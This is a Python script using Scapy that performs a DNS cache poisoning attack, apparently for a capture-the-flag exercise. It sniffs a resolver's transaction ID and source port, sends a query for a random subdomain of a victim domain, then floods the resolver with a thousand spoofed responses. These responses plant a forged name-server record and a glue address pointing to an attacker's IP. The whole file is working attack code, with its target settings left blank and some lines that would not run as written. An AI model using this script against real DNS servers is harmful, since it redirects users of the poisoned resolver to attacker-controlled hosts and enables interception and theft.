from scapy.all import *
import threading
import sys
import socket
from dnslib import *
import time


DNS_SERVER_IP	    = ''                    # IP address of the vulnerable DNS server
ATTACKER_IP		    = ''                    # IP address of the DNS Server of the attacker
VICTIM_AUTH_DNS     = ''                    # Ip address of the authoritative name server of the victim domain name
FAKE_IP             = ''                    # The spoofed IP address we want to set in the remote DNS server
ATTACKER_PORT       =                       # The port we use to send a random query to the vulnerable DNS server
FLAG_PORT           =                       # Number of port to listen to in order to capture the flag
BAD_AUTH_DNS        = ''                    # Name server of the attacker
VICTIM_DOMAIN       = ''                    # The victim domain name
QUERY_TXID          =                       # Transaction ID to send a random query to the vulnerable DNS server
RANDOM_SUBDOMAIN    = "rnd-sdomain"         # A random sub-domain of the victim domain


def lookup(target_domain, dns_server):
    print("[*] DNS lookup query for "+target_domain)
    time.sleep(2)
    request = "dig "+target_domain+ " @" +dns_server
    os.system(request)

def sniffPackets():
    print('[*] Sniffing DNS Packets ')
    pkts = sniff(iface='eth0', filter=" src 10.10.0.1 and dst port 53", count=1, promisc =1)
    clientSrcPort = pkts[0].getlayer(UDP).sport
    clientDNSQueryID = pkts[0].getlayer(DNS).id
    print("Source Port: " + str(clientSrcPort))
    print("Query ID: " + str(clientDNSQueryID))
    return clientDNSQueryID, clientSrcPort

def sendRandomDNSQuery(sip, dip, sport, txid, target_domain):
    print("[*] sending crafted random query to  " + target_domain)
    query = (IP(src=sip, dst=dip) /
             UDP(sport=sport, dport=53) /
             DNS(id=txid, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
                 qd=DNSQR(qname=RANDOM_SUBDOMAIN+"."+target_domain, qtype='A', qclass='IN'),
                 an=0,
                 ns=0,
                 ar=0
                 ))
    send(query)


def sendCraftedPackets(sip, dip, dport, txid, target_domain, fake_ip):
    print("[*] Flooding the target DNS server")
    pkt = IP(src=sip, dst=dip) / \
          UDP(sport=53, dport=dport) / \
          DNS(id=txid, qr=1, opcode=0, aa=0, tc=0, rd=0, ra=0, z=0, rcode=0, qdcount=1,ancount=0, nscount=1, arcount=2,
              qd=(DNSQR(qname=RANDOM_SUBDOMAIN+"."+target_domain, qtype='A', qclass='IN')),
              ns=(DNSRR(rrname=target_domain, type='NS', rclass='IN', ttl=3600, rdata='ns.'+target_domain)),
              ar=(DNSRR(rrname='ns.'+target_domain, type='A', rclass='IN', ttl=3600, rdata=fake_ip))
            )

    pkt.getlayer(UDP).len = IP(str(pkt)).len - 20
    pkt[UDP].post_build(str(pkt[UDP]), str(pkt[UDP].payload))


    for i in range(1000):
        pkt[DNS].id = txid
        txid += 1
        send(pkt, verbose=0)
    print("[*] Flooding finished")


def listen(ip, port):
    print ("[*] listen to response from server")
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    listen_sock.bind((ip, port))
    secret, addr = listen_sock.recvfrom(1024)
    print ("Flag: " + secret)

#1- Make a dns query to an authoritative dns zone
try:
    dig = threading.Thread(target=lookup, args=(BAD_AUTH_DNS, DNS_SERVER_IP))
    dig.setDaemon(True)
    dig.start()
except:
    print ("Error digging")
#2- Sniff the query to get txid and source port of the target dns server
sniffed_txid, sniffed_sport  = sniffPackets()
#3- Send a query of a subdomain not in the vulnerable DNS's cache
sendRandomDNSQuery(ATTACKER_IP, DNS_SERVER_IP, ATTACKER_PORT, QUERY_TXID, VICTIM_DOMAIN)
#4- Flood the vulnerable DNS server with crafted DNS respones
sendCraftedPackets(VICTIM_AUTH_DNS, DNS_SERVER_IP, sniffed_sport, sniffed_txid, VICTIM_DOMAIN, FAKE_IP)
#5- Listen to the port 31337 to catch the secret
try:
    listenThread = threading.Thread(target=listen, args=(ATTACKER_IP, FLAG_PORT))
    listenThread.setDaemon(True)
    listenThread.start()
except:
    print ("Error listening")